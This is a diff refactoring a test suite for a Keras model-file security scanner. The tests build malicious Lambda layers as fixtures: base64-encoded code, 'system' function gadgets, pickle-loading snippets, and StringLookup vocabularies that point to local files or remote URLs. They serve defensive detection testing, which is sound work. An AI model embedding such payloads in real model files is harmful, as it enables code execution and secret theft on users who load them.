@@ -32,6 +32,7 @@ from modelaudit.scanners.pickle_scanner import PickleScanner
 from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.hdf5 import HDF5_SIGNATURE_SCAN_MAX_BYTES, hdf5_metadata_checksum
 from modelaudit.utils.helpers import cache_decorator as cache_decorator_module
+from tests.cache_lifecycle import IsolatedCacheManager
 from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field
 from tests.helpers.cache import assert_inconclusive_not_cached as _assert_inconclusive_keras_zip_scan_not_cached
 from tests.helpers.scanners import assert_preflighted_archive_survives_replacement
@@ -40,6 +41,11 @@ try:
     import h5py
 except ImportError:  # pragma: no cover - optional dependency in some environments
     h5py = None
+
+
+def _sequential_config(layer: dict[str, Any]) -> dict[str, Any]:
+    """Return a fresh Sequential config around the supplied layer."""
+    return {"class_name": "Sequential", "config": {"layers": [layer]}}
 
 
 class _CountingList(list[Any]):
@@ -1120,8 +1126,7 @@ class TestKerasZipScanner:
         )
         cache_dir = tmp_path / "embedded-hdf5-cache"
 
-        reset_cache_manager()
-        try:
+        with IsolatedCacheManager(lambda: reset_cache_manager()):
             first = scan_model_directory_or_file(
                 str(keras_path),
                 cache_enabled=True,
@@ -1145,8 +1150,6 @@ class TestKerasZipScanner:
             second_stats = cache_manager.get_stats()
             assert second_stats["total_entries"] == first_stats["total_entries"]
             assert second_stats["cache_hits"] > first_stats["cache_hits"]
-        finally:
-            reset_cache_manager()
 
     def test_embedded_weights_missing_h5py_returns_exit2_and_skips_cache(
         self,
@@ -1179,8 +1182,7 @@ class TestKerasZipScanner:
         assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
 
         cache_dir = tmp_path / "missing-h5py-cache"
-        reset_cache_manager()
-        try:
+        with IsolatedCacheManager(lambda: reset_cache_manager()):
             first_result = scan_model_directory_or_file(
                 str(keras_path),
                 cache_enabled=True,
@@ -1204,8 +1206,6 @@ class TestKerasZipScanner:
                 )
 
             assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-        finally:
-            reset_cache_manager()
 
     def test_embedded_weights_missing_h5py_invalidates_stale_cache_entries(
         self,
@@ -1221,8 +1221,7 @@ class TestKerasZipScanner:
         )
         cache_dir = tmp_path / "stale-missing-h5py-cache"
 
-        reset_cache_manager()
-        try:
+        with IsolatedCacheManager(lambda: reset_cache_manager()):
             original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
             monkeypatch.setattr(
                 cache_decorator_module,
@@ -1257,8 +1256,6 @@ class TestKerasZipScanner:
             assert determine_exit_code(second_result) == 2
             assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
             assert reason in metadata.get("scan_outcome_reasons")
-        finally:
-            reset_cache_manager()
 
     def test_embedded_weights_runtime_h5py_failure_bypasses_stale_cache(
         self,
@@ -1272,8 +1269,7 @@ class TestKerasZipScanner:
         )
         cache_dir = tmp_path / "runtime-h5py-failure-cache"
 
-        reset_cache_manager()
-        try:
+        with IsolatedCacheManager(lambda: reset_cache_manager()):
             original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
             monkeypatch.setattr(
                 cache_decorator_module,
@@ -1312,8 +1308,6 @@ class TestKerasZipScanner:
             assert determine_exit_code(failed_result) == 2
             assert "keras_zip_scan_failed" in metadata["scan_outcome_reasons"]
             assert cache_manager.get_stats()["total_entries"] == cached_entries
-        finally:
-            reset_cache_manager()
 
     def test_normalized_embedded_weights_bypass_stale_cache(
         self,
@@ -1328,8 +1322,7 @@ class TestKerasZipScanner:
             archive.write(weights_path, "./model.weights.h5")
         cache_dir = tmp_path / "normalized-members-cache"
 
-        reset_cache_manager()
-        try:
+        with IsolatedCacheManager(lambda: reset_cache_manager()):
             original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
             monkeypatch.setattr(
                 cache_decorator_module,
@@ -1365,8 +1358,6 @@ class TestKerasZipScanner:
 
             assert determine_exit_code(failed_result) == 2
             assert "keras_zip_scan_failed" in metadata["scan_outcome_reasons"]
-        finally:
-            reset_cache_manager()
 
     @pytest.mark.parametrize("libver", [None, "latest"])
     def test_userblock_embedded_weights_missing_h5py_returns_exit2(
@@ -3045,20 +3036,15 @@ __import__('pickle').loads(data)
 """
         encoded_code = base64.b64encode(dangerous_code.encode()).decode()
 
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "dangerous_lambda",
-                        "config": {
-                            "function": [encoded_code, None, None],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "dangerous_lambda",
+                "config": {
+                    "function": [encoded_code, None, None],
+                },
             },
-        }
+        )
 
         temp_path = tmp_path / "multiple_patterns.keras"
         with zipfile.ZipFile(temp_path, "w") as zf:
@@ -3086,20 +3072,15 @@ __import__('pickle').loads(data)
         safe_code = "lambda x: x * 2"
         encoded_code = base64.b64encode(safe_code.encode()).decode()
 
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "safe_lambda",
-                        "config": {
-                            "function": [encoded_code, None, None],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "safe_lambda",
+                "config": {
+                    "function": [encoded_code, None, None],
+                },
             },
-        }
+        )
 
         temp_path = tmp_path / "safe_lambda.keras"
         with zipfile.ZipFile(temp_path, "w") as zf:
@@ -3115,18 +3096,13 @@ __import__('pickle').loads(data)
         """Opaque compiled Lambda bytecode should remain a warning-level finding."""
         scanner = KerasZipScanner()
         encoded_code = base64.b64encode(marshal.dumps((lambda x: x + 1).__code__)).decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "opaque_lambda",
-                        "config": {"function": [encoded_code, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "opaque_lambda",
+                "config": {"function": [encoded_code, None, None]},
             },
-        }
+        )
 
         result = scanner.scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3157,22 +3133,17 @@ __import__('pickle').loads(data)
         function_data: Any = [encoded_code, None, None]
         if function_format == "dict":
             function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "mixed_module_lambda",
-                        "config": {
-                            "function": function_data,
-                            "module": module_name,
-                            "function_name": "system",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "mixed_module_lambda",
+                "config": {
+                    "function": function_data,
+                    "module": module_name,
+                    "function_name": "system",
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3195,21 +3166,16 @@ __import__('pickle').loads(data)
         module_name: str,
     ) -> None:
         """Benign module identifiers containing suspicious substrings should remain quiet."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "benign_module_lambda",
-                        "config": {
-                            "module": module_name,
-                            "function_name": "normalize",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "benign_module_lambda",
+                "config": {
+                    "module": module_name,
+                    "function_name": "normalize",
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3226,25 +3192,20 @@ __import__('pickle').loads(data)
         function_name: str,
     ) -> None:
         """Keras 3 named-function Lambda metadata must not bypass module checks."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "nested_named_function",
-                        "config": {
-                            "function": {
-                                "module": module_name,
-                                "class_name": "function",
-                                "config": function_name,
-                                "registered_name": function_name,
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "nested_named_function",
+                "config": {
+                    "function": {
+                        "module": module_name,
+                        "class_name": "function",
+                        "config": function_name,
+                        "registered_name": function_name,
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3268,25 +3229,20 @@ __import__('pickle').loads(data)
         function_name: str,
     ) -> None:
         """Benign named functions must not inherit module-wide critical severity."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "benign_named_function",
-                        "config": {
-                            "function": {
-                                "module": module_name,
-                                "class_name": "function",
-                                "config": function_name,
-                                "registered_name": function_name,
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "benign_named_function",
+                "config": {
+                    "function": {
+                        "module": module_name,
+                        "class_name": "function",
+                        "config": function_name,
+                        "registered_name": function_name,
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3297,21 +3253,16 @@ __import__('pickle').loads(data)
 
     def test_lambda_function_name_does_not_escalate_with_benign_module(self, tmp_path: Path) -> None:
         """A custom function sharing a gadget name must not be treated as a stdlib gadget."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "dangerous_function_lambda",
-                        "config": {
-                            "module": "custom_package.math",
-                            "function_name": "system",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "dangerous_function_lambda",
+                "config": {
+                    "module": "custom_package.math",
+                    "function_name": "system",
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3322,18 +3273,13 @@ __import__('pickle').loads(data)
 
     def test_lambda_function_name_without_module_is_warning(self, tmp_path: Path) -> None:
         """Sensitive function names without provenance should remain visible without critical attribution."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "unattributed_function_lambda",
-                        "config": {"function_name": "system"},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "unattributed_function_lambda",
+                "config": {"function_name": "system"},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3348,25 +3294,20 @@ __import__('pickle').loads(data)
 
     def test_malformed_nested_named_lambda_function_is_warning(self, tmp_path: Path) -> None:
         """Malformed nested callable metadata must fail closed without retaining its payload."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "malformed_nested_function",
-                        "config": {
-                            "function": {
-                                "module": None,
-                                "class_name": "function",
-                                "config": ["system"],
-                                "registered_name": None,
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "malformed_nested_function",
+                "config": {
+                    "function": {
+                        "module": None,
+                        "class_name": "function",
+                        "config": ["system"],
+                        "registered_name": None,
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3395,18 +3336,13 @@ __import__('pickle').loads(data)
         function_data: Any = [encoded_code, None, None]
         if function_format == "dict":
             function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "substring_lambda",
-                        "config": {"function": function_data},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "substring_lambda",
+                "config": {"function": function_data},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3430,18 +3366,13 @@ __import__('pickle').loads(data)
                 "class_name": "__lambda__",
                 "config": {"code": encoded_code},
             }
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "network_lambda",
-                        "config": {"function": function_data},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "network_lambda",
+                "config": {"function": function_data},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3462,18 +3393,13 @@ __import__('pickle').loads(data)
         function_data: Any = [encoded_code, None, None]
         if function_format == "dict":
             function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "marshalled_dotted_lambda",
-                        "config": {"function": function_data},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "marshalled_dotted_lambda",
+                "config": {"function": function_data},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3501,18 +3427,13 @@ __import__('pickle').loads(data)
             raise AssertionError("oversized Lambda bytecode was decoded")
 
         monkeypatch.setattr(keras_utils_module.base64, "b64decode", fail_decode)
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "oversized_lambda",
-                        "config": {"function": function_data},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "oversized_lambda",
+                "config": {"function": function_data},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3529,23 +3450,18 @@ __import__('pickle').loads(data)
     def test_malformed_dict_lambda_diagnostic_does_not_echo_payload(self, tmp_path: Path) -> None:
         """Malformed Lambda metadata diagnostics must not retain attacker-controlled payloads."""
         payload = "do-not-echo-this-payload"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "malformed_lambda",
-                        "config": {
-                            "function": {
-                                "class_name": "__lambda__",
-                                "config": payload,
-                            }
-                        },
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "malformed_lambda",
+                "config": {
+                    "function": {
+                        "class_name": "__lambda__",
+                        "config": payload,
                     }
-                ]
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3573,18 +3489,13 @@ __import__('pickle').loads(data)
         expected_code_type: str | None,
     ) -> None:
         """Malformed list-format Lambda metadata must remain a security finding."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "malformed_list_lambda",
-                        "config": {"function": function_data},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "malformed_list_lambda",
+                "config": {"function": function_data},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3613,21 +3524,16 @@ __import__('pickle').loads(data)
         function_name: Any,
     ) -> None:
         """Malformed mixed module/function metadata must not be silently accepted."""
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "malformed_module_lambda",
-                        "config": {
-                            "module": module_name,
-                            "function_name": function_name,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "malformed_module_lambda",
+                "config": {
+                    "module": module_name,
+                    "function_name": function_name,
+                },
             },
-        }
+        )
 
         result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))
 
@@ -3648,18 +3554,13 @@ __import__('pickle').loads(data)
         external_vocab_path = tmp_path / "leaked-vocab.txt"
         external_vocab_path.write_text("secret-token\n", encoding="utf-8")
 
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": str(external_vocab_path)},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": str(external_vocab_path)},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
         result = scanner.scan(str(model_path))
@@ -3674,18 +3575,13 @@ __import__('pickle').loads(data)
     def test_redacted_local_version_still_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
         """StringLookup attribution must classify the unredacted local version."""
         raw_secret = "sk-proj-CAND061ZIPLOOKUPVERSIONSECRET000000000000"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": str(tmp_path / "vocab.txt")},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": str(tmp_path / "vocab.txt")},
             },
-        }
+        )
         model_path = create_configured_keras_zip(
             tmp_path,
             config,
@@ -3703,18 +3599,13 @@ __import__('pickle').loads(data)
     def test_stringlookup_remote_vocabulary_url_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
         """Remote StringLookup vocabulary URLs should also be attributed to CVE-2025-12058."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": "https://example.com/vocab.txt"},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": "https://example.com/vocab.txt"},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
         result = scanner.scan(str(model_path))
@@ -3724,23 +3615,18 @@ __import__('pickle').loads(data)
     def test_stringlookup_remote_vocabulary_url_redacts_credentials(self, tmp_path: Path) -> None:
         """Remote vocabulary findings should not preserve credentials or query secrets."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {
-                            "vocabulary": (
-                                "https://user:secret@example.com/download/"
-                                "api_key=sk-secret-value/vocab.txt?token=sensitive#fragment"
-                            )
-                        },
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {
+                    "vocabulary": (
+                        "https://user:secret@example.com/download/"
+                        "api_key=sk-secret-value/vocab.txt?token=sensitive#fragment"
+                    )
+                },
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
         result = scanner.scan(str(model_path))
@@ -3761,18 +3647,13 @@ __import__('pickle').loads(data)
     def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
         """Inline StringLookup vocabularies are benign and should not emit warnings."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": ["red", "green", "blue"]},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": ["red", "green", "blue"]},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
         result = scanner.scan(str(model_path))
@@ -3799,18 +3680,13 @@ __import__('pickle').loads(data)
         scanner = KerasZipScanner()
         external_vocab_path = tmp_path / "vocab.txt"
         external_vocab_path.write_text("token\n", encoding="utf-8")
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": str(external_vocab_path)},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": str(external_vocab_path)},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
         result = scanner.scan(str(model_path))
@@ -3837,18 +3713,13 @@ __import__('pickle').loads(data)
         scanner = KerasZipScanner()
         external_vocab_path = tmp_path / "vocab.txt"
         external_vocab_path.write_text("token\n", encoding="utf-8")
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": str(external_vocab_path)},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": str(external_vocab_path)},
             },
-        }
+        )
         model_path = tmp_path / "model.keras"
         with zipfile.ZipFile(model_path, "w") as zf:
             zf.writestr("config.json", json.dumps(config))
@@ -3876,18 +3747,13 @@ __import__('pickle').loads(data)
         scanner = KerasZipScanner()
         external_vocab_path = tmp_path / "vocab.txt"
         external_vocab_path.write_text("token\n", encoding="utf-8")
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": str(external_vocab_path)},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": str(external_vocab_path)},
             },
-        }
+        )
 
         for keras_version in ("3.12.0a0", "3.12.0rc1", "3.12.0_c1", "3.12.0.dev0"):
             model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
@@ -3901,18 +3767,13 @@ __import__('pickle').loads(data)
     def test_stringlookup_noncanonical_version_is_warning_exit1(self, tmp_path: Path) -> None:
         """Malformed Keras metadata should not be treated as a verified fixed version."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": "vocab.txt"},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": "vocab.txt"},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.12.0rc1junk")
         result = scanner.scan(str(model_path))
@@ -3933,18 +3794,13 @@ __import__('pickle').loads(data)
     def test_stringlookup_noncanonical_pre_fix_version_keeps_cve_attribution(self, tmp_path: Path) -> None:
         """A malformed suffix cannot erase a release tuple that is definitely below the fix."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "StringLookup",
-                        "name": "string_lookup",
-                        "config": {"vocabulary": "vocab.txt"},
-                    },
-                ],
+        config = _sequential_config(
+            {
+                "class_name": "StringLookup",
+                "name": "string_lookup",
+                "config": {"vocabulary": "vocab.txt"},
             },
-        }
+        )
 
         model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3rc1junk")
         result = scanner.scan(str(model_path))
@@ -3963,19 +3819,14 @@ __import__('pickle').loads(data)
         """Test detection of custom registered objects."""
         scanner = KerasZipScanner()
 
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "registered_name": "custom_package.CustomDense",
-                        "config": {},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "registered_name": "custom_package.CustomDense",
+                "config": {},
             },
-        }
+        )
 
         temp_path = tmp_path / "custom_registered.keras"
         with zipfile.ZipFile(temp_path, "w") as zf:
@@ -4135,24 +3986,19 @@ __import__('pickle').loads(data)
         encoded_code = base64.b64encode(malicious_code.encode()).decode()
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "TimeDistributed",
-                            "name": "wrapped_lambda",
-                            "config": {
-                                "layer": {
-                                    "class_name": "Lambda",
-                                    "name": "inner_lambda",
-                                    "config": {"function": [encoded_code, None, None]},
-                                },
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "TimeDistributed",
+                    "name": "wrapped_lambda",
+                    "config": {
+                        "layer": {
+                            "class_name": "Lambda",
+                            "name": "inner_lambda",
+                            "config": {"function": [encoded_code, None, None]},
+                        },
+                    },
                 },
-            },
+            ),
             keras_version="2.10.0",
             file_name="wrapped_lambda.keras",
         )
@@ -4175,24 +4021,19 @@ __import__('pickle').loads(data)
         """Wrapper-owned custom layer configs should use the same checks as normal layers."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "TimeDistributed",
-                            "name": "wrapped_custom",
-                            "config": {
-                                "layer": {
-                                    "class_name": "MaliciousLayer",
-                                    "name": "inner_custom",
-                                    "config": {"name": "inner_bad"},
-                                },
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "TimeDistributed",
+                    "name": "wrapped_custom",
+                    "config": {
+                        "layer": {
+                            "class_name": "MaliciousLayer",
+                            "name": "inner_custom",
+                            "config": {"name": "inner_bad"},
+                        },
+                    },
                 },
-            },
+            ),
             file_name="wrapped_custom.keras",
         )
 
@@ -4251,37 +4092,32 @@ __import__('pickle').loads(data)
         """RNN cell containers must not hide custom nested cells."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "RNN",
-                            "name": "stacked_cell_wrapper",
+            _sequential_config(
+                {
+                    "class_name": "RNN",
+                    "name": "stacked_cell_wrapper",
+                    "config": {
+                        "cell": {
+                            "class_name": "StackedRNNCells",
+                            "name": "stacked_cells",
                             "config": {
-                                "cell": {
-                                    "class_name": "StackedRNNCells",
-                                    "name": "stacked_cells",
-                                    "config": {
-                                        "cells": [
-                                            {
-                                                "class_name": "LSTMCell",
-                                                "name": "safe_cell",
-                                                "config": {"name": "safe_cell"},
-                                            },
-                                            {
-                                                "class_name": "MaliciousCell",
-                                                "name": "inner_bad_cell",
-                                                "config": {"name": "inner_bad_cell"},
-                                            },
-                                        ]
+                                "cells": [
+                                    {
+                                        "class_name": "LSTMCell",
+                                        "name": "safe_cell",
+                                        "config": {"name": "safe_cell"},
                                     },
-                                }
+                                    {
+                                        "class_name": "MaliciousCell",
+                                        "name": "inner_bad_cell",
+                                        "config": {"name": "inner_bad_cell"},
+                                    },
+                                ]
                             },
                         }
-                    ]
+                    },
                 },
-            },
+            ),
             file_name="wrapped_recurrent_cell.keras",
         )
 
@@ -4307,18 +4143,13 @@ __import__('pickle').loads(data)
         """Malformed wrapper `config.layer` values make nested-layer coverage incomplete."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": wrapper_class,
-                            "name": "broken_wrapper",
-                            "config": {"layer": "not a layer dict"},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": wrapper_class,
+                    "name": "broken_wrapper",
+                    "config": {"layer": "not a layer dict"},
                 },
-            },
+            ),
             file_name="broken_wrapped_layer.keras",
         )
 
@@ -4337,24 +4168,19 @@ __import__('pickle').loads(data)
         """Trusted fully-qualified Keras wrappers should not become custom-layer false positives."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "keras.layers.TimeDistributed",
-                            "name": "qualified_wrapper",
-                            "config": {
-                                "layer": {
-                                    "class_name": "keras.layers.Dense",
-                                    "name": "inner_dense",
-                                    "config": {"units": 1},
-                                },
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "keras.layers.TimeDistributed",
+                    "name": "qualified_wrapper",
+                    "config": {
+                        "layer": {
+                            "class_name": "keras.layers.Dense",
+                            "name": "inner_dense",
+                            "config": {"units": 1},
+                        },
+                    },
                 },
-            },
+            ),
             file_name="qualified_wrapped_layer.keras",
         )
 
@@ -4373,18 +4199,13 @@ __import__('pickle').loads(data)
         """Custom namespaces that resemble Keras wrappers must not inherit trusted wrapper semantics."""
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": wrapper_class,
-                            "name": "custom_wrapper",
-                            "config": {"layer": "ordinary custom metadata"},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": wrapper_class,
+                    "name": "custom_wrapper",
+                    "config": {"layer": "ordinary custom metadata"},
                 },
-            },
+            ),
             file_name="untrusted_qualified_wrapper.keras",
         )
 
@@ -4405,24 +4226,19 @@ __import__('pickle').loads(data)
         wrapper_class = "keras.src.layers.evil.TimeDistributed"
         keras_path = create_configured_keras_zip(
             tmp_path,
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": wrapper_class,
-                            "name": "custom_wrapper",
-                            "config": {
-                                "layer": {
-                                    "class_name": "Lambda",
-                                    "name": "nested_lambda",
-                                    "config": {"function": [encoded_code, None, None]},
-                                }
-                            },
+            _sequential_config(
+                {
+                    "class_name": wrapper_class,
+                    "name": "custom_wrapper",
+                    "config": {
+                        "layer": {
+                            "class_name": "Lambda",
+                            "name": "nested_lambda",
+                            "config": {"function": [encoded_code, None, None]},
                         }
-                    ]
+                    },
                 },
-            },
+            ),
             keras_version="2.10.0",
             file_name="untrusted_qualified_wrapper_lambda.keras",
         )
@@ -4444,26 +4260,21 @@ __import__('pickle').loads(data)
